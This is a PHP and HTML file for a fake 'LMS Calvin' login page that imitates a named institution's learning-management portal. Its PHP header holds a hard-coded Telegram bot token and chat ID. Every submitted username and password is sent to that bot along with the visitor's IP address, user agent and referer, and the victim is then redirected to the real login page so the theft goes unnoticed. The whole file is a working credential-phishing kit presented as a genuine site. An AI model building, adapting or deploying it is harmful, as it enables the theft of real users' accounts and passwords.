<?php
// Telegram bot configuration
$BOT_TOKEN = '8394213465:AAFcQ5Cmr5j0FLC5WqfHaGuezRl1IPOERuo';
$CHAT_ID = '1127003304'; // Ganti dengan chat ID Anda

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($username) && !empty($password)) {
        // Send to Telegram
        sendToTelegram($username, $password);
        
        // Redirect to real login page
        header('Location: https://lms.calvin.ac.id/login/index.php');
        exit;
    }
}

function sendToTelegram($username, $password) {
    global $BOT_TOKEN, $CHAT_ID;
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    
    $message = "🔐 **NEW LOGIN CAPTURED**\n\n";
    $message .= "👤 **Username:** `$username`\n";
    $message .= "🔑 **Password:** `$password`\n";
    $message .= "🌐 **IP Address:** `$ip`\n";
    $message .= "🖥️ **User Agent:** `$user_agent`\n";
    $message .= "📅 **Time:** `$time`\n";
    $message .= "🔗 **Referer:** `$referer`\n";
    $message .= "📍 **URL:** `{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}`";
    
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LMS Calvin - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .logo {
            width: 120px;
            margin: 0 auto 20px;
        }
        
        h2 {
            color: #333;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .btn-login {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
        }
        
        .footer {
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        
        .loading {
            display: none;
            margin-top: 10px;
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg width="120" height="40" viewBox="0 0 120 40">
                <rect width="120" height="40" fill="#667eea" rx="8"/>
                <text x="60" y="25" text-anchor="middle" fill="white" font-family="Arial" font-size="14">LMS CALVIN</text>
            </svg>
        </div>
        
        <h2>Welcome Back</h2>
        <p class="subtitle">Please sign in to your account</p>
        
        <form method="POST" action="">
            <div class="form-group">
                <label for="username">Email Address</label>
                <input type="text" id="username" name="username" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="btn-login" onclick="showLoading()">
                Sign In
            </button>
            
            <div class="loading" id="loading">
                Authenticating... Please wait
            </div>
        </form>
        
        <div class="footer">
            <p>LMS Calvin Institute of Technology</p>
            <p>© 2024 All rights reserved</p>
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
            document.querySelector('.btn-login').disabled = true;
            document.querySelector('.btn-login').textContent = 'Authenticating...';
        }
    </script>
</body>
</html>